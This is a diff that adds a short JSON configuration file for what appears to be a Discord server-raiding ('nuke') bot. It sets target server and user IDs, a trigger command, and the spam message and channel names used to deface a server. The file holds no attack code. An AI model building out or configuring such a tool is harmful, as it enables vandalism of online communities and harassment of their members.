@@ -1,0 +1,15 @@
+{
+    "bot_token": "",
+    "guild_name": "NUKED SERVER",
+    "channel_name": "nuked",
+    "spam_message": "@everyone SERVER NUKED",
+    "targeted_user_id": 0,
+    "target_server_ids": [],
+    "protected_user_id": 0,
+    "channel_topics": [
+        "NUKED CHANNEL",
+        "SERVER DESTROYED",
+        "GET NUKED"
+    ],
+    "nuke_command": "!test"
+}
